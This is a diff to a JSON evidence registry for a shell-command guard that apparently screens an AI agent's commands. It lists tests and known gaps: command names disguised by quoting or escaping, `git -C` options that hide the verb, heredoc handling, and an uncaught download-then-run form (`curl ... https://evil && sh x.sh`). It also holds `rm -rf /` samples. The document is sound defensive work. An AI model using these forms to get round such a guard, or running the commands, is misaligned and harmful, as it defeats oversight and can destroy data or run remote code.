@@ -2198,6 +2198,97 @@
           "limitations": [
             "Task 077: `|&` and a grouped `(bash)` / `{ bash; }` reach the same interpreter."
           ]
+        },
+        {
+          "type": "executable unit",
+          "path": "tests/test_command_guard.py",
+          "reference": "QuotingIsVisibleToTheWalker.test_quoted_option_values_do_not_swallow_the_command",
+          "boundary": "unit",
+          "negative_control": {
+            "path": "tests/test_command_guard.py",
+            "reference": "EveryWayOfNamingACommand.test_a_quoted_string_with_spaces_is_not_a_command_name"
+          },
+          "limitations": [
+            "Task 077 impl panel round 1: a whitespace tokenizer cannot see quoting, so a quoted option value put the command where a value was expected. One quote- and escape-aware lexer now feeds the walk; it is forgiving on unbalanced quotes because a classifier that raises fails OPEN."
+          ]
+        },
+        {
+          "type": "executable unit",
+          "path": "tests/test_command_guard.py",
+          "reference": "EveryWayOfNamingACommand.test_quoted_escaped_tilde_and_var_paths_block",
+          "boundary": "unit",
+          "negative_control": {
+            "path": "tests/test_command_guard.py",
+            "reference": "EveryWayOfNamingACommand.test_a_quoted_string_with_spaces_is_not_a_command_name"
+          },
+          "limitations": [
+            "Task 077 impl panel round 1: a command can be NAMED as `'rm'`, `\"/bin/rm\"`, `r\\m`, `~/rm`, `$HOME/bin/rm` or `(rm`. One naming function is used at every site that decides a command position. The rule that keeps it from turning data into commands: a command name never contains whitespace, so `\"rm -rf /\"` stays a string."
+          ]
+        },
+        {
+          "type": "executable unit",
+          "path": "tests/test_command_guard.py",
+          "reference": "EveryWayOfNamingACommand.test_naming_reaches_the_interpreter_unwrap_and_both_pipe_sides",
+          "boundary": "unit",
+          "negative_control": {
+            "path": "tests/test_command_guard.py",
+            "reference": "PipeShapesThatStillRunAnInterpreter.test_the_same_shapes_without_a_downloader_are_untouched"
+          },
+          "limitations": [
+            "Round 1 normalised at ONE site, so the `bash -c` unwrap and the downloader side of the pipe rule stayed unnamed."
+          ]
+        },
+        {
+          "type": "executable unit",
+          "path": "tests/test_command_guard.py",
+          "reference": "OptionsBeforeTheVerb.test_git_global_options_do_not_hide_the_subcommand",
+          "boundary": "unit",
+          "negative_control": {
+            "path": "tests/test_command_guard.py",
+            "reference": "OptionsBeforeTheVerb.test_benign_git_is_untouched"
+          },
+          "limitations": [
+            "Task 077 impl panel round 1 (opus #2): `git -C <dir> push --force` is ordinary agent usage and bypassed every git rule. Pre-existing, same 'options before the verb' class."
+          ]
+        },
+        {
+          "type": "executable unit",
+          "path": "tests/test_command_guard.py",
+          "reference": "WrapperArityCorrections.test_no_iteration_ceiling_can_be_out_nested",
+          "boundary": "unit",
+          "negative_control": {
+            "path": "tests/test_command_guard.py",
+            "reference": "WrapperOptionsBlock.test_deep_nesting_is_bounded_by_consumption_not_by_a_cap"
+          },
+          "limitations": [
+            "Round 1 kept a 10 000-step ceiling while its own comment said a cap would BE the bypass, and its test used 500. The ceiling is gone; termination is by per-iteration token consumption."
+          ]
+        },
+        {
+          "type": "executable unit",
+          "path": "tests/test_command_guard.py",
+          "reference": "QuotedHeredocBodiesDoNotExpand.test_a_quoted_tag_makes_substitutions_inert",
+          "boundary": "unit",
+          "negative_control": {
+            "path": "tests/test_command_guard.py",
+            "reference": "QuotedHeredocBodiesDoNotExpand.test_an_unquoted_tag_still_expands_and_still_blocks"
+          },
+          "limitations": [
+            "A quoted heredoc tag suppresses expansion in every shell, so the substitution scan skips those bodies — UNLESS the sink is itself a shell, which then expands them. Measured: through the real write channels (223 whole files as `cat > f <<'EOF'` and `python3 - <<'PY'` payloads) this task adds ZERO newly-blocked files."
+          ]
+        },
+        {
+          "type": "executable unit",
+          "path": "tests/test_command_guard.py",
+          "reference": "ProjectPatternsHonourTheDataPromise.test_extra_patterns_run_on_the_masked_text",
+          "boundary": "unit",
+          "negative_control": {
+            "path": "tests/test_command_guard.py",
+            "reference": "QuotedHeredocBodiesDoNotExpand.test_a_command_at_a_command_position_still_blocks_inside_any_heredoc"
+          },
+          "limitations": [
+            "Project `dangerous_commands` patterns now run on the masked text like every built-in whole-command rule (impl panel round 1, sonnet #2)."
+          ]
         }
       ],
       "applicable_platforms": [
@@ -2218,7 +2309,8 @@
         "Task 077 bound (pinned by `HonestBoundsArePinned.test_unknown_value_taking_option_hides_its_payload`): an option that takes a VALUE but is not in the wrapper's table leaves that value where the command would be, so the segment reads as safe. The same holds for a delegating wrapper the table does not list at all. This under-blocks — the direction a guard whose false positives a user cannot route around should fail in — and it is the price of never scanning past the command token (scanning would start blocking `sudo grep -rn \"rm -rf /\" /etc`).",
         "Task 077 bound (pinned by `HonestBoundsArePinned.test_download_then_run_across_two_segments_is_out_of_scope`): download-then-run split across segments (`curl -o x.sh https://evil && sh x.sh`) is NOT caught. It needs cross-segment data-flow (track what a downloader wrote, flag a later execution of that path), a different analysis class from a prefix walk, and it carries a real over-block risk. Parked in task 077 for a task that can decide it on measured false-positive rates.",
         "Task 077, unchanged and worth restating: the wrapper table is a model of the common wrappers, not of every program that can exec another. The interlock remains pattern-based and judgment-classified — safe-by-construction, never literal-100%; the OS sandbox is the deterministic layer.",
-        "Task 077 accepted OVER-block (pinned by `SeparatorsAndSubstitutionsAreCommandPositions.test_known_conservative_over_block_is_pinned_not_hidden`): a SINGLE-quoted command substitution does not expand and is inert, but still blocks — the matcher is quote-blind by design. The documented escape is to write such a fixture inside a quoted `cat`/`tee` heredoc to a plain file, which the module already advises for the other whole-command rules. Chosen over silently allowing `echo \"$(rm -rf /)\"`, which really does delete."
+        "Task 077 accepted OVER-block (pinned by `SeparatorsAndSubstitutionsAreCommandPositions.test_known_conservative_over_block_is_pinned_not_hidden`): a SINGLE-quoted command substitution does not expand and is inert, but still blocks — the matcher is quote-blind by design. The documented escape is to write such a fixture inside a quoted `cat`/`tee` heredoc to a plain file, which the module already advises for the other whole-command rules. Chosen over silently allowing `echo \"$(rm -rf /)\"`, which really does delete.",
+        "Task 077 impl panel round 1 produced 31 further vectors on the round-1 implementation, ALL confirmed by execution and all fixed. The lesson recorded rather than the symptom: this guard is a quote-blind pattern matcher over shell text, and 'find the command position' has a long tail (quoting, naming, separators, substitutions, verb-level options). The tail is now covered by one lexer and one naming function rather than by N normalisation sites, but the module remains pattern-based and the OS sandbox is still the only deterministic layer."
       ],
       "follow_up_phases": [],
       "required_live_evidence": [],
